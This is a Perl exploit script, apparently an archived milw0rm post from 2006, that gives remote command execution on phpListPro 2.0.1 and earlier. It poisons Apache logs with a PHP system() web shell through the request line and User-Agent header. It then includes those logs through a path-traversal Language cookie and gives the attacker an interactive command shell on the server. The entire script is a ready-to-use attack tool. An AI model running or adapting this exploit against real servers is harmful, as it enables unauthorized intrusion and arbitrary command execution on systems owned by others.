#!/usr/bin/perl
#
# Title: phpListPro <= 2.0.1 Remote Command Execution Exploit
# URL: http://www.smartisoft.com/
#
# Info: 
# - arbitrary local inclusion 
# - need magic_quotes_gpc=off
# 
#

use IO::Socket;
use LWP::Simple;

#ripped from rgod

@apache=(
  "/var/log/httpd/access_log%00",
  "/var/log/httpd/error_log%00",
  "/var/log/apache/error.log%00",
  "/var/log/apache/access.log%00",  
  "/apache/logs/error.log%00",
  "/apache/logs/access.log%00",
  "/etc/httpd/logs/acces_log%00",
  "/etc/httpd/logs/acces.log%00",
  "/etc/httpd/logs/error_log%00",
  "/etc/httpd/logs/error.log%00",
  "/var/www/logs/access_log%00",
  "/var/www/logs/access.log%00",
  "/usr/local/apache/logs/access_log%00",
  "/usr/local/apache/logs/access.log%00",
  "/var/log/apache/access_log%00",
  "/var/log/apache/access.log%00",
  "/var/log/access_log%00",
  "/var/www/logs/error_log%00",
  "/www/logs/error.log%00",
  "/usr/local/apache/logs/error_log%00",
  "/usr/local/apache/logs/error.log%00",
  "/var/log/apache/error_log%00",
  "/var/log/apache/error.log%00",
  "/var/log/access_log%00",
  "/var/log/error_log%00",
);

print "[i] phpListPro remote command execution exploit\n";
print "[i] Need magic_quotes_gpc=off\n";
print "[i] Coded by [Oo]\n\n";


if (@ARGV < 3)
{
	print "[*] Usage: phplistpro_exp.pl [host] [path] [apache_path]\n\n";
	print "[*] Apache_Path: \n";
	$i = 0;
	while($apache[$i])
	{
		print "[$i] $apache[$i]\n";
		$i++;
	}
	print "\n[*] Exemple: phplistpro_exp.pl 127.0.0.1 /phplistpro/ 1\n";
	exit();
}

$serv=$ARGV[0];
$path=$ARGV[1];
$type=$ARGV[2];

print "[+] Injecting some code in log files...\n";
#ripped from rgod
$CODE="<?php ob_clean();system(\$HTTP_COOKIE_VARS[cmd]);die;?>";
$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$serv", PeerPort=>"80") or die "[-] Connecting ... Could not connect to host.\n\n";
print $socket "GET ".$path.$CODE." HTTP/1.1\r\n";
print $socket "User-Agent: ".$CODE."\r\n";
print $socket "Host: ".$serv."\r\n";
print $socket "Connection: close\r\n\r\n";
close($socket);

print "[+] Ok! Now here the shell, type exit to quit\n";
print "[+] If it's not work maybe try another apache_path...\n\n";

print "[shell] ";
$cmd = <STDIN>;

while($cmd !~ "exit")
{
	$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$serv", PeerPort=>"80") or die "[-] Connecting ... Could not connect to host.\n\n";
	
	print $socket "GET ".$path."config.php HTTP/1.1\r\n";
	print $socket "Host: ".$serv."\r\n";
	print $socket "Accept: */*\r\n";
	print $socket "Cookie: Language=/../../../../../../../../../..".$apache[$type].";cmd=$cmd \r\n";
	print $socket "Connection: close\r\n\n";	
	
	while ($answer = <$socket>)
	{
		print $answer;
	}
	
	print "[shell] ";
	$cmd = <STDIN>;	
}

# milw0rm.com [2006-05-19]
